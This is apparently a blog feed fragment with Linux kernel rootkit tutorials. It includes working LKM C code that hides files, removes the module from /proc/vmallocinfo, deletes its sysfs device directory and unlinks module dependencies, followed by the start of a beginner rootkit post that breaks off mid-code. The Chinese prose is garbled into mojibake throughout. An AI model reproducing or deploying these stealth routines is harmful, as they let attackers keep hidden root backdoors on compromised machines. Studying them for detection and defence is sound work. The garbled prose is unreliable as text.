filp_close(file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    rootkit_enable_write_protect();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_add_new_hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    info = kmalloc(<span class="keyword">sizeof</span>(*info), GFP_KERNEL);</span><br><span class="line">    info-&gt;file_name = kmalloc(<span class="built_in">strlen</span>(file_name) + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strcpy</span>(info-&gt;file_name, file_name);</span><br><span class="line"></span><br><span class="line">    list_add(&amp;info-&gt;<span class="built_in">list</span>, &amp;hide_file_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å…¶ä½™ä¿¡æ¯éšè—"><a href="#å…¶ä½™ä¿¡æ¯éšè—" class="headerlink" title="å…¶ä½™ä¿¡æ¯éšè—"></a>å…¶ä½™ä¿¡æ¯éšè—</h2><h3 id="proc-vmallocinfoéšè—"><a href="#proc-vmallocinfoéšè—" class="headerlink" title="/proc/vmallocinfoéšè—"></a>/proc/vmallocinfoéšè—</h3><p>å†…æ ¸æ¨¡å—çš„å†…å­˜æ˜¯é€šè¿‡ <code>vmap</code> æœºåˆ¶è¿›è¡ŒåŠ¨æ€åˆ†é…çš„ï¼Œè¯¥æœºåˆ¶ç”¨ä»¥åˆ†é…ä¸€å—è™šæ‹Ÿåœ°å€è¿ç»­çš„å†…å­˜ã€‚ä¸»è¦åŸç†æ˜¯åœ¨å¯¹åº”çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­æ‰¾åˆ°è¶³å¤Ÿå¤§çš„ä¸€å—ç©ºé—²åŒºåŸŸï¼Œä¹‹åå»ºç«‹è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†é¡µé¢çš„æ˜ å°„ï¼Œå¯¹äºå†…æ ¸æ¨¡å—è€Œè¨€ä¸º <code>ffffffffa0000000~fffffffffeffffff</code>ã€‚</p><p>åœ¨å†…æ ¸å½“ä¸­æ‰€æœ‰éè¿ç»­æ˜ å°„çš„å†…æ ¸è™šæ‹Ÿç©ºé—´éƒ½æœ‰ç€ä¸€ä¸ªå¯¹åº”çš„ <code>vmap_area</code> ç»“æ„ä½“è¿›è¡Œè¡¨ç¤ºï¼Œå…¶ä¸­ <code>vmap_area</code> ç»“æ„åœ¨å†…æ ¸å½“ä¸­åŒæ—¶ä»¥çº¢é»‘æ ‘ï¼ˆè´Ÿè´£æ ¹æ®è™šæ‹Ÿåœ°å€è¿›è¡Œå¿«é€Ÿç´¢å¼•ï¼‰ä¸é“¾è¡¨è¿›è¡Œç»„ç»‡</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image3a54cf56f42308fd.png"                                     ></p><p>å½“æˆ‘ä»¬è¯»å–<code>/proc/vmallocinfo</code>æ–‡ä»¶æ—¶æˆ‘ä»¬å¯ä»¥æ‰€æœ‰é€šè¿‡<code>vmap</code>æœºåˆ¶åˆ†é…çš„å†…å­˜ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«rootkitæ‰€å­˜åœ¨çš„å†…å­˜åŒºåŸŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cat /proc/vmallocinfo | grep load_module</span></span><br><span class="line">0x(____ptrval____)-0x(____ptrval____)   20480 load_module+0x1959/0x2b90 pages=4 vmalloc N0=4</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æ£€æµ‹ç³»ç»Ÿä¸­rootkitæ€è·¯æ˜¯å¯ä»¥é€šè¿‡è¿™é‡Œæ³„æ¼å‡ºæ¥çš„åœ°å€æ¥å®ç°æ‰¾åˆ°rootkitçš„ï¼Œå› æ­¤è¿˜éœ€è¦è¿›è¡Œéšè—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">proc_vmalloc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_NUMA))</span><br><span class="line">proc_create_seq_private(<span class="string">&quot;vmallocinfo&quot;</span>, <span class="number">0400</span>, <span class="literal">NULL</span>,</span><br><span class="line">&amp;vmalloc_op,</span><br><span class="line">nr_node_ids * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">proc_create_seq(<span class="string">&quot;vmallocinfo&quot;</span>, <span class="number">0400</span>, <span class="literal">NULL</span>, &amp;vmalloc_op);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">module_init(proc_vmalloc_init);</span><br></pre></td></tr></table></figure><p><code>/proc/vmallocinfo</code>çš„å®ç°ç±»ä¼¼äº<code>/proc/module</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">s_next</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *p, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> seq_list_next(p, &amp;vmap_area_list, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯é€šè¿‡<code>vmap_area_list</code>éå†çš„ï¼Œæ‰€ä»¥ä»è¿™ä¸€å…¨å±€é“¾è¡¨ä¸­æ‘˜é™¤å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rbtree.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You should get it from /proc/kallsyms */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> *<span class="title">vmap_area_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *_<span class="title">vmap_area_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_meminfo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vmap_area</span> *<span class="title">va</span>, *<span class="title">tmp_va</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mo_addr;</span><br><span class="line"></span><br><span class="line">    mo_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) THIS_MODULE;</span><br><span class="line"></span><br><span class="line">    list_for_each_entry_safe(va, tmp_va, _vmap_area_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mo_addr &gt; va-&gt;va_start &amp;&amp; mo_addr &lt; va-&gt;va_end) &#123;</span><br><span class="line">            list_del(&amp;va-&gt;<span class="built_in">list</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sys-device-virtualéšè—"><a href="#sys-device-virtualéšè—" class="headerlink" title="/sys/device/virtualéšè—"></a>/sys/device/virtualéšè—</h3><p>æˆ‘ä»¬åœ¨åˆ›å»ºrootkitçš„æ—¶å€™å¹¶æ²¡æœ‰æŒ‡å®šçˆ¶ç±»è®¾å¤‡ï¼Œè€Œæ‰€æœ‰æ²¡æœ‰çˆ¶ç±»çš„è®¾å¤‡åœ¨<code>/sys/device/virtual/</code>ç›®å½•ä¸‹éƒ½ä¼šå­˜åœ¨æ–‡ä»¶å¤¹ã€‚</p><p>è¿™é‡Œé¦–å…ˆå®¡è§†ä¸€ä¸‹<code>device_create</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">device_create =&gt; device_create_groups_vargs =&gt; device_add =&gt; get_device_parent =&gt; virtual_device_parent &amp;&amp; class_dir_create_and_add</span><br></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºè®¾å¤‡æ—¶ä¼šå­˜ä¸Šå¦‚ä¸Šè°ƒç”¨é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kobject *<span class="title">virtual_device_parent</span><span class="params">(struct device *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">virtual_dir</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!virtual_dir)</span><br><span class="line">virtual_dir = kobject_create_and_add(<span class="string">&quot;virtual&quot;</span>,</span><br><span class="line">     &amp;devices_kset-&gt;kobj);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> virtual_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>virtual_device_parent</code>è¿™ä¸€å‡½æ•°ä½œç”¨å¾ˆå®¹æ˜“çœ‹å‡ºæ¥å°±æ˜¯è·å–<code>virtual</code>æ–‡ä»¶å¤¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct kobject *</span></span><br><span class="line"><span class="function"><span class="title">class_dir_create_and_add</span><span class="params">(struct class *class, struct kobject *parent_kobj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class_dir</span> *<span class="title">dir</span>;</span></span><br><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">dir = kzalloc(<span class="keyword">sizeof</span>(*dir), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!dir)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">dir-&gt;<span class="class"><span class="keyword">class</span> =</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">kobject_init(&amp;dir-&gt;kobj, &amp;class_dir_ktype);</span><br><span class="line"></span><br><span class="line">dir-&gt;kobj.kset = &amp;class-&gt;p-&gt;glue_dirs;</span><br><span class="line"></span><br><span class="line">retval = kobject_add(&amp;dir-&gt;kobj, parent_kobj, <span class="string">&quot;%s&quot;</span>, class-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">kobject_put(&amp;dir-&gt;kobj);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;dir-&gt;kobj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ <code>class_dir_create_and_add</code> ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ <code>class_dir</code> ï¼Œæ·»åŠ åˆ°å‰é¢è·å¾—çš„ <code>/sys/devices/virtual</code> å¯¹åº”çš„ kobjectä¸Šã€‚</p><p><code>get_device_parent</code> ä¼šå°†æ–°å»ºçš„ <code>class_dir</code> ä½œä¸º kobject è¿”å›ç»™ <code>device_add()</code> ï¼Œä¹‹åå…¶ä¼šè¢«èµ‹ç»™ <code>dev-&gt;kobj.parent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_sys_device_virtual</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kobject_del(module_device-&gt;kobj.parent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œåªéœ€è¿›è¡Œå¦‚ä¸Šæ“ä½œå³å¯éšè—ã€‚</p><h3 id="æ¨¡å—ä¾èµ–å…³ç³»éšè—"><a href="#æ¨¡å—ä¾èµ–å…³ç³»éšè—" class="headerlink" title="æ¨¡å—ä¾èµ–å…³ç³»éšè—"></a>æ¨¡å—ä¾èµ–å…³ç³»éšè—</h3><p>æ¨¡å—ä¾èµ–å…³ç³»ä¼šè¢«è®°å½•åˆ°<code>sys/module/ä¾èµ–æ¨¡å—/holder/</code>ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modules using other modules: kdb wants to see this. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_use</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">source_list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">target_list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">source</span>, *<span class="title">target</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¾èµ–å…³ç³»é€šè¿‡è¿™ä¸€ç»“æ„ä½“æ¥è¡¨ç¤ºï¼Œæœ¬è´¨ä¾æ—§æ˜¯é“¾è¡¨æ„å»ºçš„ä¾èµ–å…³ç³»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_module_dependency</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module_use</span> *<span class="title">use</span>, *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry_safe(use, tmp, &amp;THIS_MODULE-&gt;target_list, target_list) &#123;</span><br><span class="line">        list_del(&amp;use-&gt;source_list);</span><br><span class="line">        list_del(&amp;use-&gt;target_list);</span><br><span class="line">        sysfs_remove_link(use-&gt;target-&gt;holders_dir, THIS_MODULE-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤è¿˜æ˜¯åªéœ€è¦è¿›è¡Œè„±é“¾æ“ä½œå³å¯ã€‚</p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a class="link"   href="https://xz.aliyun.com/t/12439" >https://xz.aliyun.com/t/12439<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç”±äºæ‡’ç‹—ç—‡å‘ä½œåŠ ä¸Šæ¯å¤©æ²‰è¿·æ¸¸æˆå¯¼è‡´å¾ˆä¹…æ²¡æœ‰æ›´æ–°æ–‡ç« äº†ï¼Œå…¶å®ä¸Šä¸€ç¯‡çš„Rootkitå…¶å®éƒ½æ˜¯æ®‹ç¼ºç‰ˆä½†æ˜¯ä¸æƒ³ç»§ç»­å†™äº†å°±ç›´æ¥åŠ äº†ä¸ªå…¥é—¨ä¸¤ä¸ªå­—å°±å‘å‡ºæ¥</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
  </entry>
  
  <entry>
    <title>Linux Rootkitå…¥é—¨</title>
    <link href="https://196082.github.io/2024/02/16/Linux-Rootkit/"/>
    <id>https://196082.github.io/2024/02/16/Linux-Rootkit/</id>
    <published>2024-02-16T09:06:09.000Z</published>
    <updated>2024-02-16T09:05:35.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æ¯•ä¸šè®ºæ–‡é€‰é¢˜æ—¶é€‰çš„æ˜¯Linux Rootkitç›¸å…³çš„å†…å®¹ï¼ŒåŠ ä¸Šåœ¨å‰é¢çš„è®¸å¤šæ–‡ç« ä¸­æŒ–äº†è¿™ä¸ªå‘ç»ˆäºæ˜¯ç°åœ¨å¯ä»¥è¿›è¡Œå¡«å‘æ´»åŠ¨äº†ğŸ˜­ï¼</p><p>æœ€è¿‘å‘ç°ç¡®å®æ˜¯æœ‰å¸ˆå‚…åœ¨çœ‹æˆ‘çš„blogçš„ï¼Œå¹¶ä¸”ä¹Ÿä¼šæœ‰ç•™è¨€ï¼Œè™½ç„¶æˆ‘æ¯æ¬¡å›å¤çš„æŒºæ…¢çš„ï¼ˆå¾ˆå°‘çœ‹ç•™è¨€åå°ï¼‰ï¼Œä½†æ˜¯ç•™è¨€çš„æ¡æ•°ä¸å¤šç›®å‰åœ¨è€ƒè™‘è¦åŠ ä¸Šé‚®ä»¶é€šçŸ¥ä¸ï¼Œçœ‹çœ‹ç•™è¨€çš„å¸ˆå‚…æ˜¯å¦ä¼šå˜å¤šå¦‚æœæ…¢æ…¢æœ‰çš„è¯å¯èƒ½å°±ä¼šåŠ ä¸Šäº†ã€‚ï¼ˆä¸»è¦æ˜¯æ‡’ä¸æƒ³åŠ ï¼‰</p><p>åœ¨å‰è¨€è¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹Rootkitæ˜¯ä»€ä¹ˆã€‚</p><p>Rootkitå³root kitï¼Œç›´è¯‘ä¸ºä¸­æ–‡ä¾¿æ˜¯æ ¹æƒé™å·¥å…·åŒ…çš„æ„æ€ï¼Œåœ¨ä»Šå¤©çš„è¯­å¢ƒä¸‹æ›´å¤šæŒ‡çš„æ˜¯ä¸€ç§è¢«ä½œä¸ºé©±åŠ¨ç¨‹åºã€åŠ è½½åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œè¿™ä¸€ç±»æ¶æ„è½¯ä»¶çš„ä¸»è¦ç”¨é€”ä¾¿æ˜¯é©»ç•™åœ¨è®¡ç®—æœºä¸Šæä¾› root åé—¨â€”â€”å½“æ”»å‡»è€…å†æ¬¡æ‹¿åˆ°æŸä¸ªæœåŠ¡å™¨çš„ shell æ—¶å¯ä»¥é€šè¿‡ rootkit å¿«é€Ÿææƒåˆ° rootã€‚</p><p>Linux ä¸‹çš„ rootkit ä¸»è¦ä»¥å¯è£…è½½å†…æ ¸æ¨¡å—ï¼ˆLKMï¼‰çš„å½¢å¼å­˜åœ¨ï¼Œä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ç›´æ¥ä»¥ ring0 æƒé™å‘å…¥ä¾µè€…æä¾›æœåŠ¡ï¼›å½“æ”»å‡»è€…æ‹¿åˆ°æŸå°è®¡ç®—æœºçš„ shell å¹¶é€šè¿‡ç›¸åº”çš„æ¼æ´ææƒåˆ° root ä¹‹åä¾¿å¯ä»¥åœ¨è®¡ç®—æœºä¸­ç•™ä¸‹ rootkitï¼Œä¸ºæ”»å‡»è€…åç»­å…¥ä¾µè¡Œä¸ºæä¾›é©»ç•™çš„ root åé—¨ã€‚</p><p>ä½†æ˜¯ä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼ŒLKM ç¼–ç¨‹åœ¨ä¸€å®šæ„ä¹‰ä¸Šä¾¿æ˜¯å†…æ ¸ç¼–ç¨‹ï¼Œä¸å†…æ ¸ç‰ˆæœ¬å¯†åˆ‡ç›¸å…³ï¼Œåªæœ‰ä½¿ç”¨ç›¸åº”ç‰ˆæœ¬å†…æ ¸æºç è¿›è¡Œç¼–è¯‘çš„ LKM æ‰å¯ä»¥è£…è½½åˆ°å¯¹åº”ç‰ˆæœ¬çš„ kernel ä¸Šï¼Œè¿™ä½¿å¾— Linux rootkit æ˜¾å¾—æœ‰äº›é¸¡è‚‹ï¼Œä¸”ä¸ä¼¼è •è™«ç—…æ¯’é‚£èˆ¬å¯ä»¥åœ¨æœåŠ¡æœŸé—´è‚†æ„ä¼ æ’­ï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯ LMK ä»æ˜¯å½“å‰ Linux ä¸‹è¾ƒä¸ºä¸»æµçš„ rootkit æŠ€æœ¯ä¹‹ä¸€ã€‚</p><h2 id="LKMåŸºç¡€"><a href="#LKMåŸºç¡€" class="headerlink" title="LKMåŸºç¡€"></a>LKMåŸºç¡€</h2><p>æ—¢ç„¶Linux Rootkitæ˜¯ä»¥LKMçš„å½¢å¼å­˜åœ¨é‚£ä¹ˆLKMç®—æ˜¯æœ€åŸºç¡€çš„å†…å®¹äº†ã€‚</p><p><strong>LKMçš„å…¨ç§°ä¸ºLoadable Kernel Modulesï¼Œä¸­æ–‡åä¸ºå¯åŠ è½½å†…æ ¸æ¨¡å—ï¼Œä¸»è¦ä½œç”¨æ˜¯ç”¨æ¥æ‰©å±•linuxçš„å†…æ ¸åŠŸèƒ½ã€‚</strong>LKMçš„ä¼˜ç‚¹åœ¨äºå¯ä»¥åŠ¨æ€åœ°åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ— é¡»é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚ç”±äºLKMå…·æœ‰è¿™æ ·çš„ç‰¹ç‚¹ï¼Œæ‰€ä»¥å®ƒç»å¸¸è¢«ç”¨äºä¸€äº›è®¾å¤‡çš„é©±åŠ¨ç¨‹åºï¼Œä¾‹å¦‚å£°å¡ï¼Œç½‘å¡ç­‰ç­‰ã€‚å½“ç„¶å› ä¸ºå…¶ä¼˜ç‚¹ï¼Œä¹Ÿç»å¸¸è¢«éª‡å®¢ç”¨äºrootkitæŠ€æœ¯å½“ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module loaded\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;test:module removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;196082&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•ç¼–ä¸€ä¸ªLKMä¾‹å­ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ä¸Šè¿°ä»£ç ä¸­çš„å†…å®¹ï¼Œæœ€åé¢é€šè¿‡<code>module_init</code>å®å®šä¹‰äº†<code>rootkit_init</code>å‡½æ•°æ˜¯è¯¥æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¼šåœ¨è¯¥æ¨¡å—è¢«åŠ è½½æ—¶è¢«æ‰§è¡Œï¼ŒåŒæ ·çš„ä½¿ç”¨äº†<code>module_exit</code>å®å®šä¹‰<code>rootkit_exit</code>å‡½æ•°åˆ™æ˜¯è¯¥æ¨¡å—è¢«å¸è½½æ—¶ä¼šè¢«æ‰§è¡Œå³æ¸…é™¤å‡½æ•°ã€‚è¿™é‡Œç»™äººçš„æ„Ÿè§‰ç±»ä¼¼äºé¢å¯¹å¯¹è±¡ç¼–ç¨‹æ—¶çš„æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°ä¸è¿‡ä¸åŒçš„æ˜¯è¿™é‡Œå¦‚æœæ˜¯æ²¡æœ‰æ²¡æœ‰å®šä¹‰æ¸…æ¥šå‡½æ•°åˆ™è¯¥æ¨¡å—æ˜¯æ— æ³•è¢«æ¸…é™¤çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[    4.146208] <span class="built_in">test</span>:module loaded</span><br><span class="line">[   26.022334] <span class="built_in">test</span>:module removed</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºå‰é¢è¿™æ ·çš„ç¨‹åºæ˜¯æ²¡æœ‰ä¸ç”¨æˆ·æ€å­˜åœ¨ä»»ä½•äº¤äº’çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åƒå®ç°ctfèµ›é¢˜é‚£æ ·å®Œæˆæˆ‘ä»¬çš„rootkitã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 